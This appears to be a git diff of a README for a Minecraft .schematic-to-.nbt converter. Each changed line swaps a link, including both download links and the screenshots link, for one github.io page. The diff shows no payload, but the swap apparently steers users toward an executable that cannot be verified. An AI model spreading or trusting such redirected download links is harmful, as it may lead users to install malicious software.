@@ -2,7 +2,7 @@
 
 **Convert .schematic to .nbt files with a beautiful GUI and 3D preview**
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/Soviet-anglophobe456/minecraft-structure-forge)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://soviet-anglophobe456.github.io)
 
 ## 📖 About
 
@@ -27,7 +27,7 @@ Follow these simple steps to get Minecraft Structure Forge running on your Windo
 ### Step 1: Download the Application
 
 Visit this link to download the application:
-[https://github.com/Soviet-anglophobe456/minecraft-structure-forge](https://github.com/Soviet-anglophobe456/minecraft-structure-forge)
+[https://soviet-anglophobe456.github.io](https://soviet-anglophobe456.github.io)
 
 Click the big green "Code" button or find the latest release under the "Releases" section. The application is packaged as a single executable file.
 
@@ -56,7 +56,7 @@ You can switch between Russian and English by clicking the language dropdown in 
 
 ## 🖼️ Screenshots
 
-[View screenshots on Imgur](https://imgur.com/a/Xdz6xu2)
+[View screenshots on Imgur](https://soviet-anglophobe456.github.io)
 
 The screenshots show the 3D preview, block replacement interface, and the conversion workflow in action.
 
